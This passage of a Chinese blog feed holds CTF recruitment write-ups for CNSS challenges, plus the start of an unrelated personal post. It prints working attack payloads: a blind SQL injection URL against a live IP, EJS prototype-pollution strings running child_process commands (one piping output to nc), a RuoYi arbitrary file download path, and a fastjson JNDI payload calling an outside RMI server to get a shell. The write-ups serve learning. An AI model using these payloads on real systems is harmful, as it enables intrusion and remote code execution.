align="center">innodb_system</td></tr><tr><td align="center">3</td><td align="center">innodb_temporary</td></tr><tr><td align="center">4</td><td align="center">innodb_undo_001</td></tr><tr><td align="center">5</td><td align="center">innodb_undo_002</td></tr><tr><td align="center">6</td><td align="center">sys&#x2F;sys_config</td></tr><tr><td align="center">7</td><td align="center">cnss&#x2F;users</td></tr><tr><td align="center">8</td><td align="center">cnss&#x2F;cn55</td></tr><tr><td align="center">9</td><td align="center">cnss&#x2F;uagents</td></tr><tr><td align="center">10</td><td align="center">cnss&#x2F;referers</td></tr></tbody></table><p>可以猜到flag应该在cnss&#x2F;cn55中</p><p><code>http://124.221.34.13:55553/?id=1 and (&#39;9&#39;,binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;)&lt;(table cn55 limit 8,1) #</code></p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="mailto:&#68;&#x75;&#x6d;&#x62;&#64;&#100;&#104;&#x61;&#107;&#107;&#97;&#110;&#46;&#99;&#x6f;&#x6d;">&#68;&#x75;&#x6d;&#x62;&#64;&#100;&#104;&#x61;&#107;&#107;&#97;&#110;&#46;&#99;&#x6f;&#x6d;</a></td></tr><tr><td align="center">2</td><td align="center"><a href="mailto:&#x41;&#110;&#x67;&#101;&#x6c;&#64;&#105;&#108;&#x6f;&#118;&#x65;&#117;&#46;&#x63;&#x6f;&#x6d;">&#x41;&#110;&#x67;&#101;&#x6c;&#64;&#105;&#108;&#x6f;&#118;&#x65;&#117;&#46;&#x63;&#x6f;&#x6d;</a></td></tr><tr><td align="center">3</td><td align="center"><a href="mailto:&#x44;&#117;&#x6d;&#109;&#121;&#64;&#x64;&#104;&#x61;&#x6b;&#x6b;&#x61;&#110;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#x44;&#117;&#x6d;&#109;&#121;&#64;&#x64;&#104;&#x61;&#x6b;&#x6b;&#x61;&#110;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a></td></tr><tr><td align="center">4</td><td align="center"><a href="mailto:&#x73;&#101;&#x63;&#x75;&#114;&#x65;&#64;&#x64;&#104;&#97;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#108;&#111;&#x63;&#x61;&#x6c;">&#x73;&#101;&#x63;&#x75;&#114;&#x65;&#64;&#x64;&#104;&#97;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#108;&#111;&#x63;&#x61;&#x6c;</a></td></tr><tr><td align="center">5</td><td align="center"><a href="mailto:&#115;&#x74;&#117;&#112;&#x69;&#100;&#x40;&#100;&#x68;&#97;&#107;&#107;&#97;&#x6e;&#46;&#108;&#111;&#99;&#x61;&#x6c;">&#115;&#x74;&#117;&#112;&#x69;&#100;&#x40;&#100;&#x68;&#97;&#107;&#107;&#97;&#x6e;&#46;&#108;&#111;&#99;&#x61;&#x6c;</a></td></tr><tr><td align="center">6</td><td align="center"><a href="mailto:&#x73;&#117;&#x70;&#101;&#114;&#x6d;&#97;&#110;&#64;&#100;&#x68;&#x61;&#107;&#107;&#97;&#x6e;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;">&#x73;&#117;&#x70;&#101;&#114;&#x6d;&#97;&#110;&#64;&#100;&#x68;&#x61;&#107;&#107;&#97;&#x6e;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;</a></td></tr><tr><td align="center">7</td><td align="center"><a href="mailto:&#x62;&#97;&#116;&#109;&#x61;&#110;&#64;&#x64;&#x68;&#x61;&#107;&#x6b;&#x61;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;">&#x62;&#97;&#116;&#109;&#x61;&#110;&#64;&#x64;&#x68;&#x61;&#107;&#x6b;&#x61;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;</a></td></tr><tr><td align="center">8</td><td align="center">CNSS{1_want_t0_b2_b1ghacker}</td></tr></tbody></table><p>别问我为什么要全写出来，我闲的</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;1_want_t0_b2_b1ghacker&#125;</code></font></center></strong></em></p><h2 id="Hard-✴️-EzPollution"><a href="#Hard-✴️-EzPollution" class="headerlink" title="[Hard] ✴️ EzPollution"></a>[Hard] ✴️ EzPollution</h2><p>真的是太Ez啦（🤐🤐🤐</p><p>观察源码，是ejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;__dirname&#125;</span>/views/index.ejs`</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;CNSS Login&#x27;</span> &#125;);<br>&#125;)<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> user = <span class="hljs-title function_">merge</span>(&#123;&#125;, req.<span class="hljs-property">query</span>)<br>    <span class="hljs-keyword">if</span> (user.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; user.<span class="hljs-property">password</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login success!&quot;</span><br>        &#125;)<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Login failed!&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Not found!&quot;</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>)<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal server error!&quot;</span><br>    &#125;)<br>&#125;)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>            <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                    <span class="hljs-title function_">merge</span>(target[key], source[key])<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    target[key] = source[key]<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">5000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, host, port)<br>&#125;);<br><br></code></pre></td></tr></table></figure><ul><li>可以看到<code>/login</code>中用的是Get请求</li></ul><p>这其实是卡我最久的地方🫥🫥🫥</p><p>不断尝试发现直接<code>a[b][c]=111</code>就行了，太痛了谁懂</p><p><img src="/posts/43716/image-20231020221007760.png" alt="image-20231020221007760"></p><ul><li>其次<code>merge</code>函数过滤了<code>__proto__</code>，所以要换个方法</li></ul><blockquote><p>根据hint：<a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">EJS - Server Side Prototype Pollution gadgets to RCE | mizu.re</a></p></blockquote><p>可以看到ejs有个注入点</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;id | nc localhost 4444&#x27;)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是hint中也是用的<code>__proto__</code>，于是乎开搜</p><blockquote><p><a href="https://juejin.cn/post/6963950629240733727">前端原型链污染漏洞竟可以拿下服务器shell？ - 掘金 (juejin.cn)</a></p></blockquote><p>发现<code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code>一样可以污染原型链</p><p>那后面就简单了</p><p>构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>client<span class="hljs-punctuation">]</span>=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;constructor<span class="hljs-punctuation">[</span>prototype<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>escapeFunction<span class="hljs-punctuation">]</span>=<span class="hljs-number">1</span>; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)<br></code></pre></td></tr></table></figure><p>注意这里的return，我找了很久的回显方式，发现当攻击完之后，在访问一次初始网页，就会自动下载命令执行结果</p><p>原理我猜测是</p><blockquote><p><del>当用escapeFn截断原始命令时<code>return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;)</code>就成了单独的一条命令</del></p><p><del>当再次访问登录界面时，会complie被污染的escapeFn使语句执行，也就会自动下载命令执行结果</del></p></blockquote><p>试过反弹shell，似乎不行（泪流满面</p><p>不确定哈。。</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;JavaScr1pt_is_4w3s0m33333&#125;</code></font></center></strong></em></p><h2 id="Hard-🥇-ruoyi-with-fastjson"><a href="#Hard-🥇-ruoyi-with-fastjson" class="headerlink" title="[Hard+] 🥇 ruoyi with fastjson"></a>[Hard+] 🥇 ruoyi with fastjson</h2><blockquote><p>Hint:</p><ul><li>环境10分钟重置一次, 请不要故意破坏环境或泄露flag, <strong>所有流量都将会被记录</strong></li><li>任意文件读取 –&gt;flag part 1</li><li>想办法从&#x2F;proc搞到jar包在哪</li><li>逆向jar包 –&gt;flag part 2</li><li>找fastjson反序列化点，搞定payload的加密解密</li><li>getshell –&gt;flag part 3</li><li>一些可能有用的项目及工具东西：<br><code>https://github.com/welk1n/JNDI-Injection-Exploit</code><br><code>https://github.com/WhiteHSBG/JNDIExploit</code><br><code>https://github.com/pen4uin/java-memshell-generator-release</code><br><code>https://xz.aliyun.com/t/12492</code><br><code>https://xz.aliyun.com/search?keyword=fastjson</code></li></ul><p>没有公网地址，可以考虑frp，例如<code>https://www.natfrp.com/</code>，或者内存马等，可以参考提供的链接2、3、4</p></blockquote><p>ruoyi版本为4.7.6</p><blockquote><p><a href="https://www.cnblogs.com/shaoqiblog/p/17305315.html">若依 4.7.6 版本 任意文件下载漏洞（审计复现） - Tanya203 - 博客园 (cnblogs.com)</a></p><p><a href="https://mp.weixin.qq.com/s/IrqLp2Z3c941NiN0fFcDMA">【<em>最新漏洞复现</em>】 RuoYi 任意文件下载漏洞 (qq.com)</a></p></blockquote><p>搜索得到漏洞为<strong>任意文件下载</strong></p><p>根据复现方法try try</p><h3 id="Flag-Part-1"><a href="#Flag-Part-1" class="headerlink" title="Flag Part 1"></a>Flag Part 1</h3><blockquote><p><strong>系统监控–&gt;定时任务</strong></p><p><img src="/posts/43716/image-20231020225955850.png" alt="image-20231020225955850"></p><p>确定，<strong>更多操作–&gt;执行一次</strong></p><p>访问<code>/common/download/resource?resource=Info.xml:.zip</code></p><p>得到flag1，<del>我才不会告诉你我不是这么获取的</del>，我当时试了半天得不到，直接第二题</p><p><em><strong>CNSS{Fr0M_4rb1trA2y</strong></em></p></blockquote><h3 id="Flag-Part-2"><a href="#Flag-Part-2" class="headerlink" title="Flag Part 2"></a>Flag Part 2</h3><p>提示<code>/proc</code></p><blockquote><blockquote><p><a href="https://zhuanlan.zhihu.com/p/378388389">Linux系统proc目录说明 - 知乎 (zhihu.com)</a></p></blockquote><ol><li><p>用上面的漏洞访问获得<code>/proc/cmdline</code></p><p>获得<code>/usr/local/jdk8/bin/java -Xms64m -Xmx512m -jar /tmp/source/ruoyi.jar </code></p></li><li><p>得到<code>jar</code>包的路径：<code>/tmp/source/ruoyi.jar</code></p><p>再用上面漏洞获得<code>jar</code></p></li><li><p>使用<code>idea</code></p><ol><li><p>进入<code>idea</code>的路径<code>IntelliJ IDEA 2023.2.3\plugins\java-decompiler\lib</code>可以注意到文件夹有个<code>java-decompiler.jar</code></p></li><li><p>把<code>ruoyi.jar</code>复制到此文件夹</p></li><li><p>创建一个<code>ruoyi</code>文件夹</p></li><li><p>命令行写入<code>java -cp &quot;xxxx\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ruoyi.jar ruoyi</code>回车执行</p></li><li><p>得到逆向的包，并解压，用<code>idea</code>打开</p></li><li><p>双击<code>shift</code>，搜索<code>part2</code>，得到flag</p><p><img src="/posts/43716/image-20231020234402549.png" alt="image-20231020234402549"></p></li></ol><p><em><strong>_f1L3_Reaol_Vuln3rab1l1Ty</strong></em></p></li></ol></blockquote><h3 id="Flag-Part-3"><a href="#Flag-Part-3" class="headerlink" title="Flag Part 3"></a>Flag Part 3</h3><blockquote><blockquote><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc）</a></p><p>获取jndi工具</p><p>JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。</p></blockquote><p>git到vps上，<del>嘿嘿我在本地试了半天</del>、</p><p>根据上面获得的源码，可知<code>fastjson</code>的攻击地址为<code>/common/sign</code>，请求方式为<code>POST</code>，且post的数据经过了AES解密</p><p>所以我们需要先加密再post</p><p>查看<code>AESUtils.java</code>的<code>decryptAES</code></p><p><img src="/posts/43716/image-20231021000823583.png" alt="image-20231021000823583"></p><p>可以看到加密类型为<code>AES/CBC/PKCS7Padding</code>，且需要base64解密</p><blockquote><p>关于jndi</p><p><a href="https://blog.csdn.net/hapenl/article/details/127299130">FastJson远程代码执行漏洞基于JNDI反弹shell使用_fastjson反弹shell_Hapen_Lu的博客-CSDN博客</a></p></blockquote><p>启动jndi服务，vps同时监听payload的端口</p><p>版本为jar1.8，选择1.8的rmi</p><p><code>&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://xxx:1099/0v7hzy &quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></p><p>随便找个aes加密网站</p><p><img src="/posts/43716/image-20231021002435641.png" alt="image-20231021002435641"></p><p>打开你的post工具，这里我用的是<code>postman</code></p><p><img src="/posts/43716/image-20231020235903632.png" alt="image-20231020235903632"></p><p>把登陆的cookie复制到postman</p><p><img src="/posts/43716/image-20231021002458070.png" alt="image-20231021002458070"></p><p>根据<code>com.ruoyi.project.system.config.domain.Sign</code></p><p><img src="/posts/43716/image-20231020235051990.png" alt="image-20231020235051990"></p><p>发送json数据</p><p><img src="/posts/43716/image-20231021002519074.png" alt="image-20231021002519074"></p><p>查看监听，可以发现已经连接上了</p><p><img src="/posts/43716/image-20231021002752134.png" alt="image-20231021002752134"></p><p>（如果跟我一样flag1没拿到也可以在这cat获得</p><p><em><strong>_to_R3m0te_COde_Ex2cuT10n!!!}</strong></em></p></blockquote><p>整理一下，得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Fr0M_4rb1trA2y_f1L3_Reaol_Vuln3rab1l1Ty_to_R3m0te_COde_Ex2cuT10n!!!&#125;</code></font></center></strong></em></p><h2 id="Boss-🗡-CNSS娘の复仇-1"><a href="#Boss-🗡-CNSS娘の复仇-1" class="headerlink" title="[Boss] 🗡 CNSS娘の复仇 - 1"></a>[Boss] 🗡 CNSS娘の复仇 - 1</h2><p><del>访问到&#x2F;assets&#x2F;发现别人的webshell没删</del></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;E4sy_Y1i2_uN5er1Aliz3_7o_RcE!&#125;</code></font></center></strong></em></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Guideline-🥰-SignIn"><a href="#Guideline-🥰-SignIn" class="headerlink" title="[Guideline] 🥰 SignIn"></a>[Guideline] 🥰 SignIn</h2><p>跟暑假赛一样，在qq群里，不会有人找不到吧~~</p><h2 id="Baby-🧐-招新平台的彩蛋"><a href="#Baby-🧐-招新平台的彩蛋" class="headerlink" title="[Baby]🧐 招新平台的彩蛋"></a>[Baby]🧐 招新平台的彩蛋</h2><p>左上角，原神启动！（其实我是翻源码找到的</p><h2 id="Easy-✨-星光下的梦想"><a href="#Easy-✨-星光下的梦想" class="headerlink" title="[Easy] ✨ 星光下的梦想"></a>[Easy] ✨ 星光下的梦想</h2><p>mp3文件，丢到<code>Audacity</code>康康，右键切到频谱图</p><p><img src="/posts/43716/image-20231025174055018.png" alt="image-20231025174055018"></p><p>对于我这种眼瞎的很不友好</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></font></center></strong></em></p><h2 id="Hard-🎉-扫码领取-flag"><a href="#Hard-🎉-扫码领取-flag" class="headerlink" title="[Hard] 🎉 扫码领取 flag"></a>[Hard] 🎉 扫码领取 flag</h2><p>如图</p><p><img src="/posts/43716/BrokenQR.png" alt="BrokenQR"></p><p><code>Format Info Pattern</code>是什么，我也不知道</p><p>这里用到一个网站：<a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a></p><p><img src="/posts/43716/image-20231025175347968.png" alt="image-20231025175347968"></p><p>用<code>Brute-force Format Info Pattern</code>爆破</p><p>稍等一下，点击左上角<code>Editor Mode</code>，出现</p><p><img src="/posts/43716/image-20231025180239074.png" alt="image-20231025180239074"></p><p>点击<code>Decode</code>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;Ur_Qr_K1NnG!&#125;</code></font></center></strong></em></p><h2 id="Baby-Hello-World-1"><a href="#Baby-Hello-World-1" class="headerlink" title="[Baby] Hello World - 1"></a>[Baby] Hello World - 1</h2><p>签到题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cnss&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-2"><a href="#Easy-Hello-World-2" class="headerlink" title="[Easy] Hello World - 2"></a>[Easy] Hello World - 2</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">72</span>, <span class="hljs-number">105</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">67</span>, <span class="hljs-number">78</span>, <span class="hljs-number">83</span>, <span class="hljs-number">83</span>, <span class="hljs-number">33</span> &#125;; <span class="hljs-comment">// Hi, CNSS!</span><br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cn33_n0_quotes&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-3"><a href="#Easy-Hello-World-3" class="headerlink" title="[Easy] Hello World - 3"></a>[Easy] Hello World - 3</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;i_d0nt_l1ke_semic0lon&#125;</code></font></center></strong></em></p><h2 id="Realworld-🌏-MCNSS"><a href="#Realworld-🌏-MCNSS" class="headerlink" title="[Realworld] 🌏 MCNSS"></a>[Realworld] 🌏 MCNSS</h2><p><em><strong><center>MC实在是太好玩啦！</center></strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;a_fAke_F1aG&#125;</code></font></center></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>疯啦</title>
    <link href="/posts/896/"/>
    <url>/posts/896/</url>
    
    <content type="html"><![CDATA[<h1 id="哈哈哈你来啦"><a href="#哈哈哈你来啦" class="headerlink" title="哈哈哈你来啦"></a>哈哈哈你来啦</h1><ul><li><input checked disabled type="checkbox"> <h5 id="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"><a href="#我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！" class="headerlink" title="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"></a>我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！</h5></li></ul><blockquote><h3 id="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"><a href="#为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？" class="headerlink" title="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"></a>为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？</h3></blockquote><ul><li><h2 